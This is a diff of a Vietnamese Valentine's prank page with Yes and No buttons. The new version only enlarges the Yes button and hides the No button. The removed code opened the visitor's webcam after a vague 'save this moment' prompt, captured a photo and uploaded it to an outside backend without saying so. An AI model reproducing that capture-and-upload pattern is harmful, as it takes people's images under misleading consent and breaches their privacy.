@@ -2,163 +2,86 @@
 <html lang="vi">
 <head>
 <meta charset="UTF-8">
-<title>Cẩn thận bắt sang cam 💖</title>
+<title>Cẩn thận bắt sáng cam 💖</title>
 <style>
-body { margin:0; height:100vh; background:linear-gradient(135deg,#ffd6e0,#ffe6f0); display:flex; justify-content:center; align-items:center; font-family:Arial; overflow:hidden;}
-.container { text-align:center; position:relative;}
-h1 { color:#ff3366;}
-button { padding:12px 25px; margin:10px; border:none; border-radius:10px; font-size:16px; cursor:pointer; z-index:2; position:relative;}
+body {
+  margin:0;
+  padding:0;
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-family:Arial;
+  background:linear-gradient(135deg,#ffd6e0,#ffe6f0);
+  flex-direction:column;
+}
+#gifContainer {
+  z-index:1;
+}
+#mainGif {
+  width:400px;
+  max-width:80vw;
+  margin-bottom:20px;
+}
+#buttonRow {
+  display:flex;
+  gap:20px;
+}
+button {
+  padding:12px 25px;
+  font-size:18px;
+  border:none;
+  border-radius:10px;
+  cursor:pointer;
+  transition: all 0.3s ease;
+}
 #yesBtn { background:#28a745; color:white;}
-#noBtn { background:#dc3545; color:white; position:absolute; top:80%; left:50%; transform:translate(-50%,-50%);}
-#gifContainer { position:relative; z-index:1; }
-.heart { position:absolute; font-size:20px; animation:float 4s linear forwards;}
-@keyframes float {0%{transform:translateY(0); opacity:1;}100%{transform:translateY(-900px); opacity:0;}}
+#noBtn { background:#dc3545; color:white; position:relative; }
 </style>
 </head>
 <body>
-<div class="container">
-  <h1 id="text">Cậu có muốn Valentine cùng tớ không? 💌</h1>
-  <div id="gifContainer">
-    <img id="mainGif" src="https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif" width="350">
-  </div>
+<div id="gifContainer">
+  <img id="mainGif" src="https://media.giphy.com/media/l0MYt5jPR6QX5pnqM/giphy.gif">
+</div>
+<div id="buttonRow">
   <button id="yesBtn">Đồng ý 💖</button>
   <button id="noBtn">Từ chối 😢</button>
 </div>
-<audio id="music" loop>
-  <source src="https://www.fesliyanstudios.com/play-mp3/387" type="audio/mpeg">
-</audio>
+
 <script>
 const yesBtn = document.getElementById("yesBtn");
 const noBtn = document.getElementById("noBtn");
-const text = document.getElementById("text");
-const music = document.getElementById("music");
-const mainGif = document.getElementById("mainGif");
 
-let cameraAsked = false;
-let noHoverCount = 0;
-let heartsCreated = 0;
-const maxHearts = 50;
+let hoverCount = 0;
+const maxHover = 6;
+const yesOriginalSize = 18; // px font-size
+let yesFontSize = yesOriginalSize;
 
-// Bấm anywhere để bật nhạc
-document.body.onclick = () => { music.play(); };
+noBtn.addEventListener("mouseover", () => {
+  if (hoverCount >= maxHover) return;
+  hoverCount++;
 
-// Nút từ chối hover logic
-const noTexts = ["Thật không? 😢","Suy nghĩ lại đi 🥺","Đừng mà 😭","Bấm nhầm đúng không 😏","Cho cơ hội đi 💔"];
-noBtn.onmouseover = () => {
-  if (noHoverCount >= 6){ noBtn.style.display="none"; return; }
-  const x = Math.random()*(window.innerWidth-100);
-  const y = Math.random()*(window.innerHeight-50);
-  noBtn.style.left = x+"px";
-  noBtn.style.top = y+"px";
-  noBtn.innerText = noTexts[Math.floor(Math.random()*noTexts.length)];
-  noHoverCount++;
-};
+  // Di chuyển nút từ chối sang trái một chút
+  const currentLeft = noBtn.offsetLeft;
+  noBtn.style.transform = `translateX(-${10 * hoverCount}px)`;
+
+  // Tăng font-size nút Đồng ý dần dần
+  yesFontSize += 4;
+  yesBtn.style.fontSize = yesFontSize + "px";
+
+  // Lần thứ 6 → biến mất nút từ chối & phóng to nút đồng ý
+  if (hoverCount === maxHover) {
+    noBtn.style.display = "none";
+    yesBtn.style.fontSize = "100px";
+    yesBtn.style.width = "80vw";
+    yesBtn.style.height = "80vh";
+  }
+});
 
 // Bấm Đồng ý
-yesBtn.onclick = handleYes;
-
-async function handleYes(){
-  if(cameraAsked) return;
-  cameraAsked = true;
-
-  const allow = confirm("Cho tớ lưu lại khoảnh khắc này nhé? 📸");
-  if(allow){
-    try{
-      await startCamera();
-      await sendImage();
-      alert("Đã lưu khoảnh khắc 💖");
-    } catch(err){
-      alert("Không bật được camera 😢");
-    }
-  } else {
-    alert("Không sao, vẫn yêu bạn 💖");
-  }
-  yesAction();
-}
-
-// Bật camera
-async function startCamera(){
-  const video = document.createElement("video");
-  video.autoplay = true;
-  video.style.position = "fixed";
-  video.style.bottom = "10px";
-  video.style.right = "10px";
-  video.style.width = "150px";
-  document.body.appendChild(video);
-  const stream = await navigator.mediaDevices.getUserMedia({video:true});
-  video.srcObject = stream;
-  window.currentVideo = video;
-}
-
-// Chụp ảnh
-function captureImage(){
-  const canvas = document.createElement("canvas");
-  const video = window.currentVideo;
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(video,0,0);
-  return canvas.toDataURL("image/png");
-}
-
-// Gửi ảnh backend
-async function sendImage(){
-  const img = captureImage();
-  await fetch("https://duong-stack-valentine-telegram-back-plum.vercel.app/upload",{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({image:img})
-  });
-}
-
-// Hiệu ứng sau khi đồng ý
-function yesAction(){
-  text.innerHTML="Tớ biết mà 😍💖 Yêu cậu!!!";
-  yesBtn.style.display="none";
-  mainGif.src="https://media.giphy.com/media/MDJ9IbxxvDUQM/giphy.gif";
-  mainGif.width = 400;
-
-  // Tạo tim giới hạn
-  const heartInterval = setInterval(()=>{
-    if(heartsCreated >= maxHearts){
-      clearInterval(heartInterval);
-      return;
-    }
-    createHeart();
-    heartsCreated++;
-  }, 150);
-
-  createConfetti();
-}
-
-// Tạo tim
-function createHeart(){
-  const heart = document.createElement("div");
-  heart.classList.add("heart");
-  heart.innerHTML = "💖";
-  heart.style.left = Math.random()*window.innerWidth+"px";
-  heart.style.top = window.innerHeight+"px";
-  document.body.appendChild(heart);
-  setTimeout(()=>heart.remove(),4000);
-}
-
-// Confetti
-function createConfetti(){
-  for(let i=0;i<100;i++){
-    const conf = document.createElement("div");
-    conf.style.position = "absolute";
-    conf.style.width = "8px";
-    conf.style.height = "8px";
-    conf.style.background = "hsl("+Math.random()*360+",100%,50%)";
-    conf.style.left = Math.random()*window.innerWidth+"px";
-    conf.style.top = "-10px";
-    document.body.appendChild(conf);
-    let fall = setInterval(()=>{
-      conf.style.top = (conf.offsetTop+5)+"px";
-      if(conf.offsetTop>window.innerHeight){ conf.remove(); clearInterval(fall);}
-    },20);
-  }
-}
+yesBtn.addEventListener("click", () => {
+  alert("Cậu đã chọn Đồng ý 💖");
+});
 </script>
 </body>
 </html>
